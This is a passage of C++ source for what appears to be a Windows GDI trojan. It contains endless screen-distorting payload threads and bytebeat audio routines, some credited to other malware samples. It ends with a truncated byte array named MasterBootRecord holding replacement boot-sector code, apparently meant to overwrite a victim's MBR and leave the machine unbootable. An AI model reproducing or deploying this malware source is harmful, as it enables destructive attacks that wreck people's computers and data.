				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fxCombined) / 15000.0 + 0.09, 1.0);
				hslcolor.s += 1.f;
				if (hslcolor.l < 1.5033f) { hslcolor.l += 0.2f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
		i++;
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload10_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), power = 74;
	while (true)
	{
		for (int angle = 0; angle < 361; angle += PI / 2) {
			hdc = GetDC(0);
			int x = power * asin(cosf(angle * PI / 90.f)), y = power * atan(cosf(angle * PI / 450.f));
			StretchBlt(hdc, x / 2, y / 2, w - x, h - y, hdc, 0, 0, w, h, SRCCOPY);
			ReleaseDC(0, hdc);
			Sleep(100);
			//if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
		}
	}
	return 0;
}
DWORD WINAPI Payload11_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, w, h, 1, 24 };
	PRGBTRIPLE rgbtriple;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / h;
			int fx0 = -(round(sqrt((x + (i * 4)) ^ (y + (i * 4))) * 10));
			int fx1 = floor(cbrt((x + (i * 4)) & (y + (i * 4))) * 10);
			int fx2 = -(ceil(fabs((x + (i * 4)) | (y + (i * 4))) * 10));
			rgbtriple[i].rgbtRed -= fx0 - 16;
			rgbtriple[i].rgbtGreen -= fx1 + 32;
			rgbtriple[i].rgbtBlue += fx2;
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0x00;
}
DWORD WINAPI Payload11_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), mazelarper_s_dick_num = 0;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdcCopy, 0, 0, w, h, hdcCopy, mazelarper_s_dick_num - w, 0, SRCCOPY);
		BitBlt(hdcCopy, -mazelarper_s_dick_num, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		BitBlt(hdcCopy, 0, 0, w, h, hdcCopy, 0, mazelarper_s_dick_num - h, SRCCOPY);
		BitBlt(hdcCopy, 0, -mazelarper_s_dick_num, w, h, hdcCopy, 0, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		mazelarper_s_dick_num = mazelarper_s_dick_num + 1;
		if (h <= mazelarper_s_dick_num) { mazelarper_s_dick_num = 0; }
		ReleaseDC(0, hdc);
		Sleep(69.69);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload12_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RECT rect;
	POINT pt[3];
	while (true)
	{
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &rect);
		pt[0].x = rand() % w;
		pt[0].y = rand() % h;
		pt[1].x = rand() % w;
		pt[1].y = rand() % h;
		pt[2].x = rand() % w;
		pt[2].y = rand() % h;
		PlgBlt(hdc, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		BitBlt(hdc, rand() % 24, rand() % 24, w, h, hdc, rand() % 24, rand() % 24, NOTSRCCOPY);
		StretchBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, rand() % w, rand() % h, SRCINVERT);
		StretchBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, rand() % w, rand() % h, SRCERASE);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdc, hbrush);
		PatBlt(hdc, rand() % w, rand() % h, -w, h, PATINVERT);
		PatBlt(hdc, rand() % w, rand() % h, w, -h, PATINVERT);
		PatBlt(hdc, rand() % w, rand() % h, -w, -h, PATINVERT);
		PatBlt(hdc, rand() % w, rand() % h, w, h, PATINVERT);
		SelectObject(hdc, hbrushCopy);
		DeleteObject(hbrush);
		ReleaseDC(0, hdc);
		Sleep(50);
	}
	return 0;
}

VOID WINAPI bytebeat1() {//credits to ultradasher965
	int nSamplesPerSec = 48000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * 5 * ((t >> 14) % 11 & -t >> 45) >> (t >> 1) % 4) & 129 - 1));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat2() {
	int nSamplesPerSec = 16000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((7 + (t >> 8)) * (t ^ t + (8 * t & t >> 9 | 3 * t & t << 6)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat3() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((((((t + ((t / 24) & (t + (t / 2)) ^ 4 >> (24 * t))) - (t * cos(t - 2 ^ t)))))))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat4() {
	int nSamplesPerSec = 11111.1, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t >> 10 & t) * ((22 - t >> 10) - 1) ^ (t * ((24 + t >> 10) + (32 - ~t << 7)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat5() {//original bytebeat from rapacuronium.exe
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((((t ^ (t >> t | t) >> 6) + (2 * t)) | (t & t + (t >> 12)) * t)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat6() {
	int nSamplesPerSec = 44111.111, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((((((~(13 * t & t >> 13 & t >> 13) * t >> 7) - (13E5 / ((t % 32767) + 1)))))))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat7() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((((t >> 13 & t >> 13 & 3) & t >> 13 | 13 * t & t >> 13) + (t * (t >> 13 | t >> 24) | t >> 38 ^ t))))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat8() {//original bytebeat from platinum.exe
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * (t >> 11 * (t >> 4 | t >> 5) & (14 | 19 * (t >> 19) >> t | t >> 81)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat9() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((3 * (t ^ (((2 * t & (t >> 9)) - 1) % 19) & (6 * t | (t >> 13))) - (9 + t)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat10() {
	int nSamplesPerSec = 24050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((3 * t) ^ ((14 * t * ((t >> 1) | (t >> 9))) >> 2) / (t + 1)) & 128);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat11() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((t * 3) ^ ~(3 * t & t >> 4 + t * (15 & t >> 9) * (26 & t >> 5) & t >> 3) % 589 - t))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat12() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t & 4096 ? t / 1 * (t ^ t % 111) | t >> 1 : t / 1 * (1 + (1 & t >> 1)) >> (1 & t >> 1) | (t & 1111 ? (t & 16384 ? 6 : 5) * t : t) | ((((t * (t & 16384 ? 6 : 5) * (4 - (1 & t >> 8)) >> (3 & t >> 9)) | t >> 6) + (t * t >> 8) / 4))))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}

const unsigned char MasterBootRecord[2560] = { 0xBB,0xE0,0x07,0x8E,0xC3,0x8E,0xDB,0xB8,0x16,0x02,0xB9,0x02,0x00,0xB6,0x00,0xBB,0x00,0x00,0xCD,0x13,0x31,0xC0,0x89,0xC3,0x89,0xC1,0x89,0xC2,0xBE,0x00,0x00,0xBF,0xC4,0x07,0xAC,0x81,0xFE,0xC4,0x07,0x73,0x31,0x3C,0x80,0x73,0x02,0xEB,0x0F,0x24,0x7F,0x88,0xC1,0xAC,0xAA,0xFE,0xC9,0x80,0xF9,0xFF,0x75,0xF7,0xEB,0xE4,0xB4,0x00,0x3C,0x40,0x72,0x05,0x24,0x3F,0x88,0xC4,0xAC,0x89,0xC1,0xAD,0x89,0xF2,0x89,0xFE,0x29,0xC6,0xAC,0xAA,0xE2,0xFC,0x89,0xD6,0xEB,0xC8,0xB8,0x13,0x00,0xCD,0x10,0xBB,0xE0,0x07,0x8E,0xDB,0xBE,0xC4,0x07,0xB4,0x00,0xAC,0xBB,0x00,0x00,0x89,0xC1,0xBA,0xC8,0x03,0x88,0xD8,0xEE,0x43,0xBA,0xC9,0x03,0xAC,0xEE,0xAC,0xEE,0xAC,0xEE,0xE2,0xEE,0xBB,0x00,0xA0,0x8E,0xC3,0xBF,0x00,0x00,0xB9,0x00,0x7D,0xF3,0xA5,0xF4,0xEB,0xFD,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0xAA,0x96,0x06,0x3F,0x1F,0x09,0x22,0x00,0x05,0x2D,0x39,0x07,0x3F,0x3C,0x00,0x28,0x12,0x29,0x00,0x00,0x00,0x03,0x03,0x03,0x03,0x04,0x04,0x00,0x08,0x08,0x00,0x10,0x10,0x00,0x20,0x20,0x00,0x34,0x34,0x00,0x83,0x00,0x00,0x00,0x00,0x04,0x04,0x00,0x08,0x08,0x00,0x10,0x10,0x00,0x1C,0x1C,0x00,0x83,0x01,0x01,0x01,0x01,0x04,0x04,0x00,0x08,0x08,0x00,0x10,0x10,0x00,0x20,0x20,0x00,0x04,0x04,0x00,0x83,0x02,0x02,0x02,0x02,0x04,0x04,0x00,0x08,0x08,0x00,0x10,0x10,0x00,0x0E,0x0E,0x00,0x83,0x04,0x04,0x04,0x04,0x04,0x04,0x00,0x08,0x08,0x00,0x0E,0x0E,0x00,0x40,0xF3,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0xBF,0x40,0x01,0x3C,0x3F,0x01,0x41,0x03,0x40,0x01,0x3D,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0x73,0x40,0x01,0x1E,0x3F,0x01,0x40,0x71,0x40,0x01,0x40,0x83,0x3F,0x01,0x40,0xBC,0x40,0x01,0x40,0x84,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0xF9,0x40,0x01,0x40,0x74,0x3F,0x01,0x40,0xAC,0x40,0x01,0x86,0x05,0x05,0x05,0x05,0x05,0x05,0x05,0x41,0x1B,0x40,0x01,0x22,0x3D,0x01,0x1C,0x41,0x01,0x40,0x93,0xBF,0x03,0x40,0x6E,0x40,0x01,0x24,0x3D,0x01,0x1A,0x42,0x01,0x40,0x94,0x7F,0x02,0x40,0x86,0x40,0x01,0x10,0x3F,0x01,0x16,0x41,0x01,0x41,0x01,0x40,0x01,0x29,0x7F,0x02,0x41,0x16,0x40,0x01,0x2A,0x3E,0x01,0x15,0x41,0x01,0x40,0x47,0x3F,0x01,0x40,0xD1,0x40,0x01,0x15,0x3F,0x01,0x13,0x41,0x01,0x40,0x75,0x3F,0x01,0x40,0xA2,0x40,0x01,0x17,0x3F,0x01,0x41,0x12,0x40,0x01,0x2E,0x3F,0x01,0x12,0x41,0x01,0x40,0xFF,0x40,0x01,0x2E,0xBE,0x03,0x12,0x40,0x01,0x40,0x76,0x3F,0x01,0x40,0xA0,0x40,0x01,0x1A,0x3F,0x01,0x10,0x41,0x01,0x40,0x96,0x7F,0x02,0x40,0x69,0x40,0x01,0x32,0x3F,0x01,0x0F,0x41,0x01,0x41,0x40,0x40,0x01,0x40,0xFE,0x40,0x01,0x34,0x3F,0x01,0x0E,0x41,0x01,0x40,0x96,0xFF,0x04,0x40,0x7D,0x40,0x01,0x20,0x3F,0x01,0x0C,0x40,0x01,0x40,0x97,0x3F,0x06,0x40,0x67,0x40,0x01,0x36,0x7F,0x02,0x41,0x09,0x40,0x01,0x27,0x3F,0x01,0x11,0x16,0x00,0x41,0x2E,0x40,0x01,0x12,0x16,0x00,0x41,0x07,0x40,0x01,0x24,0x3B,0x0B,0x1F,0x4A,0x15,0x40,0x77,0x3F,0x01,0x40,0xA9,0x40,0x01,0x20,0x8A,0x16,0x40,0xFC,0x40,0x01,0x30,0xB2,0x17,0x41,0x40,0x40,0x01,0x0B,0x19,0x00,0x40,0xA1,0x3F,0x01,0x40,0x86,0x40,0x01,0x21,0x59,0x01,0x40,0xFC,0x40,0x01,0x23,0xB6,0x17,0x41,0x1C,0x40,0x01,0x24,0xB2,0x1C,0x20,0x5A,0x01,0x40,0x78,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0x83,0x40,0x01,0x25,0x32,0x1F,0x41,0x40,0x40,0x01,0x41,0x1A,0x40,0x01,0x23,0xEF,0x22,0x22,0x40,0x01,0x40,0x76,0xBA,0x1C,0x40,0x84,0x40,0x01,0x24,0x2F,0x24,0x13,0x6B,0x1B,0x40,0x56,0x40,0x01,0x32,0x3F,0x01,0x40,0x9E,0x40,0x01,0x09,0x27,0x01,0x41,0x3F,0x40,0x01,0x20,0x9B,0x02,0x40,0x7A,0xBF,0x03,0x40,0x80,0x40,0x01,0x20,0x11,0x29,0x19,0xEB,0x22,0x40,0x54,0x40,0x01,0x40,0x55,0x3F,0x01,0x40,0x